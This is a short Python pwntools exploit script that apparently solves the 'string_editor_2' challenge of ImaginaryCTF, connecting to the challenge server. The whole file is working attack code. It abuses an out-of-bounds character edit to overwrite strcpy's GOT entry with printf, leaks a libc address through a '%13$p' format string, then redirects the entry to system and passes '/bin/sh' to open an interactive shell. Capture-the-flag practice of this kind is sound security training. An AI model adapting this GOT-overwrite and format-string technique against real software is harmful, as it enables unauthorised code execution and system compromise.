from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

# io = process("./string_editor_2")
io = remote("chal.imaginaryctf.org", 42005)


def edit(idx, x):
    io.sendlineafter(b"What character would you like to edit?", str(idx))
    io.sendlineafter(b"What character should be in that index?", chr(x))


def writebytes(idx, b: bytes):
    for i in range(len(b)):
        edit(idx + i, b[i])


target = 0x601080
strcpy_got = 0x601018
printf_plt = 0x400600

writebytes(strcpy_got - target, p64(printf_plt))
writebytes(0, b"%13$p")
io.sendlineafter(b"What character would you like to edit?", "15")
io.sendlineafter(b"3. Exit", "2")
io.recvuntil(b"0x")
libc_base = int(io.recv(12), 16) - 0x270B3
print(hex(libc_base))

system = libc_base + 0x55410
writebytes(strcpy_got - target, p64(system))
writebytes(0, b"/bin/sh\0")
io.sendlineafter(b"What character would you like to edit?", "15")
io.sendlineafter(b"3. Exit", "2")

io.interactive()
